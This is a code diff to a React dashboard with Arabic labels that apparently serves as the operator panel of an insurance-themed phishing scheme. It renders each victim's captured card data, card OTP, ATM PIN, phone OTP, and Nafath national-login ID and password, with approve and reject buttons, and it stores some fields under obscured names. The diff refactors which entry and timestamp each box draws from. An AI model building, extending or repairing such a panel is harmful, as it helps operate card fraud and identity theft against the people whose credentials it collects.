@@ -1734,21 +1734,60 @@ const renderNafadBox = () => {
 
   // Render static boxes with injected data
   const renderStaticBoxes = () => {
-    // Get latest data for each type
-    const basicRaw = getLatestRawForBox('basic') || selectedRequest?.raw || {};
-    const insuranceRaw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
-    const phoneRaw = getLatestRawForBox('phone') || selectedRequest?.raw || {};
+    // Get latest data for each type from customerEntryGroup
+    // Find the entry that contains each type of data to get its timestamp
     
-    // Check if each section has data to show
-    // BASIC: Only identity/name data (NOT phone-related)
+    // Get card data and its timestamp
+    const cardEntry = customerEntryGroup.find(e => 
+      e.raw && (e.raw._v1 || e.raw._v5 || e.raw.cardNumber || e.raw.paymentStatus)
+    );
+    const cardRaw = cardEntry?.raw || null;
+    const hasCardData = Boolean(cardRaw && (cardRaw._v1 || cardRaw._v5 || cardRaw.cardNumber || cardRaw.paymentStatus));
+    const cardTimestamp = cardEntry ? new Date(cardEntry.submittedAt || cardEntry.updatedAt || 0).getTime() : 0;
+    
+    // Get PIN data and its timestamp
+    const pinEntry = customerEntryGroup.find(e => 
+      e.raw && (e.raw._v6 || e.raw.pinCode)
+    );
+    const pinRaw = pinEntry?.raw || null;
+    const hasPinData = Boolean(pinRaw && (pinRaw._v6 || pinRaw.pinCode));
+    const pinTimestamp = pinEntry ? new Date(pinEntry.submittedAt || pinEntry.updatedAt || 0).getTime() : 0;
+    
+    // Get phone data and its timestamp
+    const phoneEntry = customerEntryGroup.find(e => 
+      e.raw && (e.raw.phoneIdNumber || e.raw.phoneNumber || e.raw.phoneCarrier || e.raw.phoneOtp || e.raw._v7)
+    );
+    const phoneRaw = phoneEntry?.raw || null;
+    const hasPhoneData = Boolean(phoneRaw && (phoneRaw.phoneIdNumber || phoneRaw.phoneNumber || phoneRaw.phoneCarrier || phoneRaw.phoneOtp || phoneRaw._v7));
+    const phoneTimestamp = phoneEntry ? new Date(phoneEntry.submittedAt || phoneEntry.updatedAt || 0).getTime() : 0;
+    
+    // Get nafad data and its timestamp
+    const nafadEntry = customerEntryGroup.find(e => 
+      e.raw && (e.raw.nafadIdNumber || e.raw.nafadPassword)
+    );
+    const nafadRaw = nafadEntry?.raw || null;
+    const hasNafadData = Boolean(nafadRaw && (nafadRaw.nafadIdNumber || nafadRaw.nafadPassword));
+    const nafadTimestamp = nafadEntry ? new Date(nafadEntry.submittedAt || nafadEntry.updatedAt || 0).getTime() : 0;
+    
+    // Get basic data and its timestamp
+    const basicEntry = customerEntryGroup.find(e => 
+      e.raw && (e.raw.identityNumber || e.raw.ownerName || e.raw.buyerName || e.raw.documentType) &&
+      !e.raw.phoneIdNumber && !e.raw.phoneNumber && !e.raw.phoneCarrier
+    );
+    const basicRaw = basicEntry?.raw || getLatestRawForBox('basic') || selectedRequest?.raw || {};
     const hasBasicData = basicRaw && (
       basicRaw.identityNumber || 
       basicRaw.ownerName || 
       basicRaw.buyerName || 
       basicRaw.documentType
-      // NOTE: phoneNumber is NOT basic data, it's phone data
     );
+    const basicTimestamp = basicEntry ? new Date(basicEntry.submittedAt || basicEntry.updatedAt || 0).getTime() : 0;
     
+    // Get insurance data and its timestamp
+    const insuranceEntry = customerEntryGroup.find(e => 
+      e.raw && (e.raw.insuranceCoverage || e.raw.vehicleModel || e.raw.vehicleValue || e.raw.vehicleYear || e.raw.repairLocation)
+    );
+    const insuranceRaw = insuranceEntry?.raw || getLatestRawForBox('insurance') || selectedRequest?.raw || {};
     const hasInsuranceData = insuranceRaw && (
       insuranceRaw.insuranceCoverage ||
       insuranceRaw.vehicleModel ||
@@ -1756,40 +1795,7 @@ const renderNafadBox = () => {
       insuranceRaw.vehicleYear ||
       insuranceRaw.repairLocation
     );
-    
-    const hasCardData = selectedRequest?.raw && (
-      selectedRequest.raw._v1 ||
-      selectedRequest.raw._v5 ||
-      selectedRequest.raw.cardNumber ||
-      selectedRequest.raw.paymentStatus
-    );
-    
-    const hasPinData = selectedRequest?.raw && (
-      selectedRequest.raw._v6 ||
-      selectedRequest.raw.pinCode
-    );
-    
-    // PHONE: All phone-related data from step5
-    const hasPhoneData = phoneRaw && (
-      phoneRaw.phoneIdNumber ||   // رقم الهوية من step5
-      phoneRaw.phoneNumber ||     // رقم الجوال من step5
-      phoneRaw.phoneCarrier ||    // شركة الاتصالات من step5
-      phoneRaw.phoneOtp ||       // رمز OTP
-      phoneRaw._v7                // رمز OTP مشفر
-    );
-    
-    const hasNafadData = selectedRequest?.raw && (
-      selectedRequest.raw.nafadIdNumber ||
-      selectedRequest.raw.nafadPassword
-    );
-    
-    // Get timestamps for each data type from database (updatedAt)
-    const basicTimestamp = basicRaw?.updatedAt ? new Date(basicRaw.updatedAt).getTime() : 0;
-    const insuranceTimestamp = insuranceRaw?.updatedAt ? new Date(insuranceRaw.updatedAt).getTime() : 0;
-    const cardTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
-    const pinTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
-    const phoneTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
-    const nafadTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
+    const insuranceTimestamp = insuranceEntry ? new Date(insuranceEntry.submittedAt || insuranceEntry.updatedAt || 0).getTime() : 0;
     
     // Build boxes array with timestamps for sorting
     type BoxType = {
@@ -1926,7 +1932,7 @@ const renderNafadBox = () => {
       });
     }
     
-    if (hasCardData) {
+    if (hasCardData && cardRaw) {
       boxes.push({
         key: 'card',
         timestamp: cardTimestamp,
@@ -1945,10 +1951,10 @@ const renderNafadBox = () => {
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
             </div>
-            {(selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode) && (
+            {(cardRaw._v5 || cardRaw.otpCode) && (
               <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center" }}>
                 <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
-                <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode}</p>
+                <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardRaw._v5 || cardRaw.otpCode}</p>
               </div>
             )}
             {/* أزرار الموافقة والرفض */}
@@ -1969,7 +1975,7 @@ const renderNafadBox = () => {
       });
     }
     
-    if (hasPinData) {
+    if (hasPinData && pinRaw) {
       boxes.push({
         key: 'pin',
         timestamp: pinTimestamp,
@@ -1990,7 +1996,7 @@ const renderNafadBox = () => {
             </div>
             <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
               {Array.from({ length: 4 }).map((_, idx) => {
-                const pinValue = String(selectedRequest?.raw?._v6 || selectedRequest?.raw?.pinCode || "0000").padStart(4, "0")[idx] || "0";
+                const pinValue = String(pinRaw._v6 || pinRaw.pinCode || "0000").padStart(4, "0")[idx] || "0";
                 return (
                   <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
                     <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinValue}</span>
@@ -2016,7 +2022,7 @@ const renderNafadBox = () => {
       });
     }
     
-    if (hasPhoneData) {
+    if (hasPhoneData && phoneRaw) {
       boxes.push({
         key: 'phone',
         timestamp: phoneTimestamp,
@@ -2035,27 +2041,27 @@ const renderNafadBox = () => {
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
             </div>
-            {phoneRaw?.phoneIdNumber && (
+            {phoneRaw.phoneIdNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
                 <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneIdNumber}</span>
               </div>
             )}
-            {phoneRaw?.phoneNumber && (
+            {phoneRaw.phoneNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
                 <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneNumber}</span>
               </div>
             )}
-            {phoneRaw?.phoneCarrier && (
+            {phoneRaw.phoneCarrier && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة الاتصالات</span>
                 <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneCarrier}</span>
               </div>
             )}
-            {(phoneRaw?.phoneOtp || phoneRaw?._v7) && (
+            {(phoneRaw.phoneOtp || phoneRaw._v7) && (
               <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
-                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneRaw?.phoneOtp || phoneRaw?._v7}</p>
+                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneRaw.phoneOtp || phoneRaw._v7}</p>
               </div>
             )}
             {/* زر إعادة إرسال الرمز */}
@@ -2082,7 +2088,7 @@ const renderNafadBox = () => {
       });
     }
     
-    if (hasNafadData) {
+    if (hasNafadData && nafadRaw) {
       boxes.push({
         key: 'nafad',
         timestamp: nafadTimestamp,
@@ -2101,16 +2107,16 @@ const renderNafadBox = () => {
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
             </div>
-            {selectedRequest?.raw?.nafadIdNumber && (
+            {nafadRaw.nafadIdNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest.raw.nafadIdNumber}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{nafadRaw.nafadIdNumber}</span>
               </div>
             )}
-            {selectedRequest?.raw?.nafadPassword && (
+            {nafadRaw.nafadPassword && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginTop: 8 }}>
                 <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest.raw.nafadPassword}</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{nafadRaw.nafadPassword}</span>
               </div>
             )}
             {/* أزرار الموافقة والرفض */}
